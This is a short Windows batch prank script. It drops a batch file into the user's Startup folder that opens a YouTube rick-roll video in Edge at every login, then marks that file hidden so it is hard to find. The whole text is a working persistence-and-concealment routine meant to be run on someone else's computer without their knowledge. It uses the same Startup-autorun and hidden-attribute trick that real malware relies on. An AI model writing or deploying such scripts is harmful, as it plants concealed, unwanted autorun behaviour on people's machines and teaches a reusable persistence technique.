@echo off

:: open rick roll
echo START msedge https://www.youtube.com/watch?v=xvFZjo5PgG0> "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/rickroll.bat"

:: make hidden
attrib "%appdata%/Microsoft/Windows/Start Menu/Programs/Startup/rickroll.bat" +h